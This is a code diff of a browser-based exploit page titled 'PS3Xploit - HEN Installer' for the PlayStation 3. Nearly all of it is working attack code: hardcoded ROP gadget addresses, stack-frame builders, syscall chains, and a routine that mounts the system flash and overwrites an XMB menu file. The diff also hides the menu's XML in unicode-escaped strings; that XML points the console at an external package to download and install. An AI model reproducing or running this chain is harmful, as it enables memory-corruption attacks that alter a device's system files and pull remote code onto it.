@@ -1,95 +1,84 @@
 <script>
 var xtra_data,
-	stack_frame,
-	jump_2,
-	jump_1,
-	xtra_data_addr,
-	stack_frame_addr,
-	jump_2_addr,
-	jump_1_addr,
-	offset_array = [],
-	t_out = 0,
-	search_max_threshold,
-	search_base,
-	search_size,
-	search_base_off,
-	search_size_ext,
-	gtemp_addr = 2365587456,
-	total_loops = 0,
-	max_loops = 20,
-	frame_fails = 0,
-	sp_exit = 0x8FD8DCC0,
-	ffs = 4294967295,
-	dbyte41 = 16705,
-	dbyte00 = 0,
-	byte_size = 1,
-	hword_size = 2,
-	word_size = 4,
-	dword_size = 8,
-	mbytes = 1048576,
-	stat_size_offset = 40,
-	toc_addr = 0x6F5558,
-	gadget1_addr = 0x097604,
-	gadget2_addr = 0x60A0E4,
-	gadget3_addr = 0x0D505C,
-	gadget4_addr = 0x229838,
-	gadget5_addr = 0x12BB1C,
-	gadget6_addr = 0x615CDC,
-	gadget7_addr = 0x01FFD0,
-	gadget8_addr = 0x020000,
-	gadget9_addr = 0x029B08,
-	gadget10_addr = 0x62E024,
-	gadget11_addr = 0x59A4B0,
-	gadget12_addr = 0x0C864C,
-	gadget13_addr = 0x48E5A8,
-	gadget14_addr = 0x48C7A0,
-	gadget15_addr = 0x489C88,
-	gadget_mod1_addr = 0x60EFD8,
-	gadget_mod2_addr = 0x013B74,
-	gadget_mod3_addr = 0x0B8E00,
-	gadget_mod4a_addr = 0x0D9684,
-	gadget_mod4b_addr = 0x42C778,
-	gadget_mod4c_addr = 0x054AF0,
-	gadget_mod5_addr = 0x4238DC,
-	gadget_mod6_addr = 0x020C00,
-	gadget_mod7_addr = 0x01A6AC,
-	gadget_mod8_addr = 0x2BACB8,
-	gadget_mod9_addr = 0x010B20,
-	gadget_mod10_addr = 0x1C5794,
-	gadget_mod11_addr = 0x18B144,
-	gadget_mod12_addr = 0x6331FC,
-	gadget_mod13_addr = 0x336870,
-	gadget_mod14_addr = 0x633900,
-	gadget_mod15_addr = 0x39D038,
-	gadget_mod16_addr = 0x4F732C,
-	index_key = "DA7D4B5E499A4F53B1C1A14A7484443B",
-	ps3xploit_ecdsa_key = "948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",
-	flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',
-	filesystem='CELL_FS_FAT',
+ stack_frame,
+ jump_2,
+ jump_1,
+ xtra_data_addr,
+ stack_frame_addr,
+ jump_2_addr,
+ jump_1_addr,
+ offset_array = [],
+ t_out = 0,
+ search_max_threshold,
+ search_base,
+ search_size,
+ search_base_off,
+ search_size_ext,
+ gtemp_addr = 2365587456,
+ total_loops = 0,
+ max_loops = 20,
+ frame_fails = 0,
+ sp_exit = 0x8FD8DCC0,
+ ffs = 4294967295,
+ dbyte41 = 16705,
+ dbyte00 = 0,
+ byte_size = 1,
+ hword_size = 2,
+ word_size = 4,
+ dword_size = 8,
+ mbytes = 1048576,
+ stat_size_offset = 40,
+ toc_addr = 0x6F5558,
+ toc_entry1_addr = 0x6DA3D0,
+ toc_entry2_addr = 0x725B38,
+ toc_entry3_addr = 0x6DA3C8,
+ toc_entry4_addr = 0x740000,
+ toc_entry5_addr = 0x6EB6C8,
+ toc_entry6_addr = 0x0,
+ gadget1_addr = 0x097604,
+ gadget2_addr = 0x60A0E4,
+ gadget3_addr = 0x0D505C,
+ gadget4_addr = 0x229838,
+ gadget5_addr = 0x12BB1C,
+ gadget6_addr = 0x615CDC,
+ gadget7_addr = 0x01FFD0,
+ gadget8_addr = 0x020000,
+ gadget9_addr = 0x029B08,
+ gadget10_addr = 0x62E024,
+ gadget11_addr = 0x59A4B0,
+ gadget12_addr = 0x0C864C,
+ gadget13_addr = 0x48E5A8,
+ gadget14_addr = 0x48C7A0,
+ gadget15_addr = 0x489C88,
+ gadget_mod1_addr = 0x60EFD8,
+ gadget_mod2_addr = 0x013B74,
+ gadget_mod3_addr = 0x0B8E00,
+ gadget_mod4a_addr = 0x0D9684,
+ gadget_mod4b_addr = 0x42C778,
+ gadget_mod4c_addr = 0x054AF0,
+ gadget_mod5_addr = 0x4238DC,
+ gadget_mod6_addr = 0x020C00,
+ gadget_mod7_addr = 0x01A6AC,
+ gadget_mod8_addr = 0x2BACB8,
+ gadget_mod9_addr = 0x010B20,
+ gadget_mod10_addr = 0x1C5794,
+ gadget_mod11_addr = 0x18B144,
+ gadget_mod12_addr = 0x6331FC,
+ gadget_mod13_addr = 0x336870,
+ gadget_mod14_addr = 0x633900,
+ gadget_mod15_addr = 0x39D038,
+ gadget_mod16_addr = 0x4F732C,
+ flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',
+ filesystem='CELL_FS_FAT',
+ mount_path='/dev_rewrite',
 	mount_path='/dev_rewrite',
 	fail_msg_frag="<h1><span style='color:red'>Exploit initialization failed!</h1></span>",
 	progress_msg_frag1="<h1>Initializing... ",
 	progress_msg_frag2='%</h1>',
-	write_file = "/dev_rewrite/vsh/resource/explore/xmb/category_network.xml",
-	write_file_contents='<?xml version="1.0" encoding="UTF-8"?><XMBML version="1.0"><View id="root"><Attributes><Table key="hen"><Pair key="focus_priority"><String>-1</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="hen" attr="hen" src="#hen_link"/><Query class="type:x-xmb/folder-pixmap" key="seg_premo" src="sel://localhost/nopremo?category_network.xml#seg_premo"/><Query class="type:x-xmb/folder-pixmap" key="seg_browser" src="#seg_browser"/></Items></View><View id="seg_premo"><Items><Item class="type:x-xmb/xmlpremo" key="PRemo" /></Items></View><View id="seg_browser"><Attributes><Table key="browser"><Pair key="icon_rsc"><String>tex_browser</String></Pair><Pair key="icon_notation"><String>WNT_XmbItemBrowser</String></Pair><Pair key="title_rsc"><String>msg_browser</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlwebbrowser" key="browser" attr="browser" /></Items></View><View id="hen_link"><Attributes><Table key="ps3hen_main"><Pair key="icon_rsc"><String>item_tex_Players</String></Pair><Pair key="title"><String>Install HEN</String></Pair><Pair key="info"><String>Downloads and installs the latest HEN Package (Reboot after)</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="ps3hen_main" attr="ps3hen_main" src="#ps3hen_pkg" /></Items></View><View id="ps3hen_pkg"><Attributes><Table key="ps3hen_link"><Pair key="info"><String>net_package_install</String></Pair><Pair key="pkg_src"><String>https://archive.org/download/hen-3.0.2_202012/HEN_3.0.2.pkg</String></Pair><Pair key="pkg_src_qa" ><String>https://archive.org/download/hen-3.0.2_202012/HEN_3.0.2.pkg</String></Pair><Pair key="content_name"><String>msg_install</String></Pair><Pair key="content_id"><String>CUSTOM-INSTALLER_00-0000000000000000</String></Pair><Pair key="prod_pict_path"><String>http://xmbmods.co/i/hendl.png</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlnpsignup" key="ps3hen_link" attr="ps3hen_link" /></Items></View></XMBML>';
+	toc_addr=7296344;
+
 document.write('<html><title>PS3Xploit - HEN Installer</title><div id="result"></div><div id="exploit"></div><div id="trigger"></div></html>');
-function memcpy(dest,src,len)
-{
-	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
-}
-function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
-{
-	var min_stack_size=0x20; 
-	if(r31out===null){r31out=gtemp_addr;}
-	if(r31in===null){r31in=gtemp_addr;}
-	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
-	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
-	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
-}
-function encTxt(text)
-{
-	return String.fromCharCode.apply(null,text.split('').map(function(e){return e.charCodeAt(0).toString(16)}).join('').toUpperCase().match(/[A-F0-9]{4}/g).map(function(v){return parseInt(v,16)}))
-}
+
 function showResult(str)
 {
 	document.getElementById('result').innerHTML=str;
@@ -101,11 +90,32 @@ function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)
 	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
 	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
 }
+function syscall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out)
+{
+	if(r31out===null){r31out=gtemp_addr;}
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
+	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r5_ptr-0x4)+hexdw2bin(gtemp_addr)+fill_by_8bytes(0x18,dbyte41)
+	+hexdw2bin(gadget_mod4c_addr)+fill_by_16bytes(0xB0,dbyte41)+hexdw2bin(r3_ptr)+fill_by_16bytes(0x10,dbyte41)
+	+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
 function save_file_overwrite(to,fd,buf,wlen,size,nl)
 {
 	return syscall(0x321,to,0x241,fd,0x1B6,nl,0,0,0)
 		+syscall_r3_p2p(0x323,fd,buf,size,wlen,0,0,0,0,0,0)
 		+syscall_r3_p2p(0x324,fd,0,0,0,0,0,0,0,0,0);
+}
+function load_r3_word_from_ptr_32(offset,r26out,r27out,r28out,r29out,r30out,r31out)
+{
+	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(offset-0x8)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
+	+hexdw2bin(gadget_mod15_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r26out)+hexdw2bin(r27out)+hexdw2bin(r28out)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function validate_word_from_ptr(w_ptr,opt_store,val,r29out,r30out,r31out)
+{
+	r29out=gtemp_addr;
+	r30out=gtemp_addr;
+	r31out=gtemp_addr;
+	return load_r3_word_from_ptr_32(w_ptr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,opt_store,gtemp_addr)
+	+hexdw2bin(gadget_mod12_addr)+fill_by_16bytes(0x70,dbyte00)+fill_by_8bytes(0x8,dbyte00)+hexdw2bin(val)+fill_by_16bytes(0x10,dbyte00)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41);
 }
 function hexh2bin(hex_val)
 {
@@ -264,7 +274,7 @@ function load_check()
 	if(total_loops<max_loops)
 	{
 		showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
-		t_out=setTimeout(initROP,150,false);
+		t_out=setTimeout(initROP,500,false);
 	}
 	else
 	{
@@ -312,6 +322,10 @@ function findJsVariableOffset(name,exploit_data,base,size)
 	var end_range=base+size;
 	return 0;
 }
+function memcpy(dest,src,len)
+{
+	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
+}
 function stack_frame_hookup()
 {
 	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
@@ -326,6 +340,15 @@ function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
 	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
 	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
 	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
+{
+	var min_stack_size=0x20; 
+	if(r31out===null){r31out=gtemp_addr;}
+	if(r31in===null){r31in=gtemp_addr;}
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
+	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
+	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
 }
 function fill_by_4bytes(nbytes,hex_val)
 {
@@ -366,22 +389,23 @@ function initROP(init)
 		jump_2_addr=0;
 		jump_1_addr=0;
 		search_max_threshold=70*0x100000;
-		search_base=0x80200000;
+		search_base=0x80150000;
 		search_size=2*mbytes;
-		search_base_off=0*mbytes;
-		search_size_ext=0*mbytes;
+		search_base_off=1*mbytes;
+		search_size_ext=2*mbytes;
 		total_loops++;
 		store_idx_arr1=[];
 		store_idx_arr2=[];
 
+		var write_file="/dev_rewrite/vsh/resource/explore/xmb/category_network.xml";
+		var write_file_contents=unescape("\u3C3F\u786D\u6C20\u7665\u7273\u696F\u6E3D\u2231\u2E30\u2220\u656E\u636F\u6469\u6E67\u3D22\u5554\u462D\u3822\u3F3E\u0D0A\u3C58\u4D42\u4D4C\u2076\u6572\u7369\u6F6E\u3D22\u312E\u3022\u3E0D\u0A3C\u5669\u6577\u2069\u643D\u2272\u6F6F\u7422\u3E0D\u0A3C\u4174\u7472\u6962\u7574\u6573\u3E3C\u5461\u626C\u6520\u6B65\u793D\u2268\u656E\u223E\u3C50\u6169\u7220\u6B65\u793D\u2266\u6F63\u7573\u5F70\u7269\u6F72\u6974\u7922\u3E3C\u5374\u7269\u6E67\u3E2D\u313C\u2F53\u7472\u696E\u673E\u3C2F\u5061\u6972\u3E3C\u2F54\u6162\u6C65\u3E3C\u2F41\u7474\u7269\u6275\u7465\u733E\u0D0A\u3C49\u7465\u6D73\u3E0D\u0A3C\u5175\u6572\u790D\u0A63\u6C61\u7373\u3D22\u7479\u7065\u3A78\u2D78\u6D62\u2F66\u6F6C\u6465\u722D\u7069\u786D\u6170\u2220\u0D0A\u6B65\u793D\u2268\u656E\u2220\u0D0A\u6174\u7472\u3D22\u6865\u6E22\u200D\u0A73\u7263\u3D22\u2368\u656E\u5F6C\u696E\u6B22\u2F3E\u0D0A\u3C51\u7565\u7279\u0D0A\u636C\u6173\u733D\u2274\u7970\u653A\u782D\u786D\u622F\u666F\u6C64\u6572\u2D70\u6978\u6D61\u7022\u0D0A\u6B65\u793D\u2273\u6567\u5F70\u7265\u6D6F\u220D\u0A73\u7263\u3D22\u7365\u6C3A\u2F2F\u6C6F\u6361\u6C68\u6F73\u742F\u6E6F\u7072\u656D\u6F3F\u6361\u7465\u676F\u7279\u5F6E\u6574\u776F\u726B\u2E78\u6D6C\u2373\u6567\u5F70\u7265\u6D6F\u222F\u3E0D\u0A3C\u5175\u6572\u790D\u0A63\u6C61\u7373\u3D22\u7479\u7065\u3A78\u2D78\u6D62\u2F66\u6F6C\u6465\u722D\u7069\u786D\u6170\u220D\u0A6B\u6579\u3D22\u7365\u675F\u6272\u6F77\u7365\u7222\u0D0A\u7372\u633D\u2223\u7365\u675F\u6272\u6F77\u7365\u7222\u2F3E\u0D0A\u3C2F\u4974\u656D\u733E\u0D0A\u3C2F\u5669\u6577\u3E0D\u0A3C\u5669\u6577\u2069\u643D\u2273\u6567\u5F70\u7265\u6D6F\u223E\u0D0A\u3C49\u7465\u6D73\u3E0D\u0A3C\u4974\u656D\u2063\u6C61\u7373\u3D22\u7479\u7065\u3A78\u2D78\u6D62\u2F78\u6D6C\u7072\u656D\u6F22\u206B\u6579\u3D22\u5052\u656D\u6F22\u202F\u3E0D\u0A3C\u2F49\u7465\u6D73\u3E0D\u0A3C\u2F56\u6965\u773E\u0D0A\u3C56\u6965\u7720\u6964\u3D22\u7365\u675F\u6272\u6F77\u7365\u7222\u3E0D\u0A3C\u4174\u7472\u6962\u7574\u6573\u3E0D\u0A3C\u5461\u626C\u6520\u6B65\u793D\u2262\u726F\u7773\u6572\u223E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2269\u636F\u6E5F\u7273\u6322\u3E3C\u5374\u7269\u6E67\u3E74\u6578\u5F62\u726F\u7773\u6572\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2269\u636F\u6E5F\u6E6F\u7461\u7469\u6F6E\u223E\u3C53\u7472\u696E\u673E\u574E\u545F\u586D\u6249\u7465\u6D42\u726F\u7773\u6572\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2274\u6974\u6C65\u5F72\u7363\u223E\u3C53\u7472\u696E\u673E\u6D73\u675F\u6272\u6F77\u7365\u723C\u2F53\u7472\u696E\u673E\u3C2F\u5061\u6972\u3E0D\u0A3C\u2F54\u6162\u6C65\u3E0D\u0A3C\u2F41\u7474\u7269\u6275\u7465\u733E\u0D0A\u3C49\u7465\u6D73\u3E0D\u0A3C\u4974\u656D\u2063\u6C61\u7373\u3D22\u7479\u7065\u3A78\u2D78\u6D62\u2F78\u6D6C\u7765\u6262\u726F\u7773\u6572\u2220\u6B65\u793D\u2262\u726F\u7773\u6572\u2220\u6174\u7472\u3D22\u6272\u6F77\u7365\u7222\u202F\u3E0D\u0A3C\u2F49\u7465\u6D73\u3E0D\u0A3C\u2F56\u6965\u773E\u0D0A\u3C56\u6965\u7720\u6964\u3D22\u6865\u6E5F\u6C69\u6E6B\u223E\u0D0A\u3C41\u7474\u7269\u6275\u7465\u733E\u0D0A\u3C54\u6162\u6C65\u206B\u6579\u3D22\u7073\u3368\u656E\u5F6D\u6169\u6E22\u3E0D\u0A3C\u5061\u6972\u206B\u6579\u3D22\u6963\u6F6E\u5F72\u7363\u223E\u3C53\u7472\u696E\u673E\u6974\u656D\u5F74\u6578\u5F50\u6C61\u7965\u7273\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2274\u6974\u6C65\u223E\u3C53\u7472\u696E\u673E\u496E\u7374\u616C\u6C20\u4845\u4E3C\u2F53\u7472\u696E\u673E\u3C2F\u5061\u6972\u3E0D\u0A3C\u5061\u6972\u206B\u6579\u3D22\u696E\u666F\u223E\u3C53\u7472\u696E\u673E\u446F\u776E\u6C6F\u6164\u7320\u616E\u6420\u696E\u7374\u616C\u6C73\u2074\u6865\u206C\u6174\u6573\u7420\u4845\u4E20\u5061\u636B\u6167\u6520\u2852\u6562\u6F6F\u7420\u6166\u7465\u7229\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C2F\u5461\u626C\u653E\u0D0A\u3C2F\u4174\u7472\u6962\u7574\u6573\u3E0D\u0A3C\u4974\u656D\u733E\u0D0A\u3C51\u7565\u7279\u2063\u6C61\u7373\u3D22\u7479\u7065\u3A78\u2D78\u6D62\u2F66\u6F6C\u6465\u722D\u7069\u786D\u6170\u2220\u6B65\u793D\u2270\u7333\u6865\u6E5F\u6D61\u696E\u2220\u6174\u7472\u3D22\u7073\u3368\u656E\u5F6D\u6169\u6E22\u2073\u7263\u3D22\u2370\u7333\u6865\u6E5F\u706B\u6722\u2F3E\u0D0A\u3C2F\u4974\u656D\u733E\u0D0A\u3C2F\u5669\u6577\u3E0D\u0A3C\u5669\u6577\u2069\u643D\u2270\u7333\u6865\u6E5F\u706B\u6722\u3E0D\u0A3C\u4174\u7472\u6962\u7574\u6573\u3E0D\u0A3C\u5461\u626C\u6520\u6B65\u793D\u2270\u7333\u6865\u6E5F\u6C69\u6E6B\u223E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2269\u6E66\u6F22\u3E3C\u5374\u7269\u6E67\u3E6E\u6574\u5F70\u6163\u6B61\u6765\u5F69\u6E73\u7461\u6C6C\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2270\u6B67\u5F73\u7263\u223E\u3C53\u7472\u696E\u673E\u6874\u7470\u3A2F\u2F78\u6D62\u6D6F\u6473\u2E63\u6F2F\u692F\u4845\u4E2E\u706B\u673C\u2F53\u7472\u696E\u673E\u3C2F\u5061\u6972\u3E0D\u0A3C\u5061\u6972\u206B\u6579\u3D22\u706B\u675F\u7372\u635F\u7161\u223E\u3C53\u7472\u696E\u673E\u6874\u7470\u3A2F\u2F78\u6D62\u6D6F\u6473\u2E63\u6F2F\u692F\u4845\u4E2E\u706B\u673C\u2F53\u7472\u696E\u673E\u3C2F\u5061\u6972\u3E0D\u0A3C\u5061\u6972\u206B\u6579\u3D22\u636F\u6E74\u656E\u745F\u6E61\u6D65\u223E\u3C53\u7472\u696E\u673E\u6D73\u675F\u696E\u7374\u616C\u6C3C\u2F53\u7472\u696E\u673E\u3C2F\u5061\u6972\u3E0D\u0A3C\u5061\u6972\u206B\u6579\u3D22\u636F\u6E74\u656E\u745F\u6964\u223E\u3C53\u7472\u696E\u673E\u4355\u5354\u4F4D\u2D49\u4E53\u5441\u4C4C\u4552\u5F30\u302D\u3030\u3030\u3030\u3030\u3030\u3030\u3030\u3030\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C50\u6169\u7220\u6B65\u793D\u2270\u726F\u645F\u7069\u6374\u5F70\u6174\u6822\u3E3C\u5374\u7269\u6E67\u3E68\u7474\u703A\u2F2F\u786D\u626D\u6F64\u732E\u636F\u2F69\u2F68\u656E\u646C\u2E70\u6E67\u3C2F\u5374\u7269\u6E67\u3E3C\u2F50\u6169\u723E\u0D0A\u3C2F\u5461\u626C\u653E\u0D0A\u3C2F\u4174\u7472\u6962\u7574\u6573\u3E0D\u0A3C\u4974\u656D\u733E\u0D0A\u3C49\u7465\u6D20\u636C\u6173\u733D\u2274\u7970\u653A\u782D\u786D\u622F\u786D\u6C6E\u7073\u6967\u6E75\u7022\u206B\u6579\u3D22\u7073\u3368\u656E\u5F6C\u696E\u6B22\u2061\u7474\u723D\u2270\u7333\u6865\u6E5F\u6C69\u6E6B\u222F\u3E0D\u0A3C\u2F49\u7465\u6D73\u3E0D\u0A3C\u2F56\u6965\u773E\u0D0A\u3C2F\u584D\u424D\u4C3E");
+
 		xtra_data=flash_partition.convert()
-		+index_key.convert(true)
-		+ps3xploit_ecdsa_key.convert(true)
 		+filesystem.convert()
 		+mount_path.convert()
 		+write_file.convert()
 		+fill_by_4bytes(0xC,dbyte00)
-		+encTxt(write_file_contents)
+		+write_file_contents
 		+fill_by_4bytes(0xC,dbyte00)
 		+fill_by_16bytes(0x90,dbyte00)
 		+unescape("\uFD7E");
@@ -395,9 +419,7 @@ function initROP(init)
 		}
 
 		flash_partition_addr=xtra_data_addr;
-		index_key_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
-		ps3xploit_ecdsa_key_addr=index_key_addr+index_key.convertedSize(true);
-		fs_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);
+		fs_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
 		mount_path_addr=fs_addr+filesystem.convertedSize();
 
 		write_file_addr=mount_path_addr+mount_path.convertedSize();
@@ -405,17 +427,16 @@ function initROP(init)
 		write_file_readlen_addr=write_filefd_addr+word_size;
 		write_file_contents_addr=write_file_readlen_addr+dword_size;
 
+		store_idx_arr1[0]=(write_file_contents_addr-flash_partition_addr+0x8)/2;
+
 		null_addr=write_file_contents_addr+dword_size;
+		store_idx_arr2[0]=(null_addr-flash_partition_addr+0xC)/2;
+		stat_addr=null_addr+dword_size*0x5;
 
 		stack_frame=stack_frame_hookup()
-		+store_word(7185360, 617820+4)
-		+store_word(7185352, 617820+4)
-		+store_word(7255752, 617820+4)
-		+store_word(7263660, 7370860)
-		+memcpy(7370860-0x20, index_key_addr, (index_key.length/2))
-		+memcpy(7370860,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))
+		+store_word(7256944, 617820)
 		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
-		+save_file_overwrite(write_file_addr,write_filefd_addr,write_file_contents_addr,write_file_readlen_addr,write_file_contents.length,null_addr)
+		+save_file_overwrite(write_file_addr,write_filefd_addr,write_file_contents_addr,write_file_readlen_addr,0x80C,null_addr)
 		+stack_frame_exit();
 
 		while(stack_frame_addr===0)
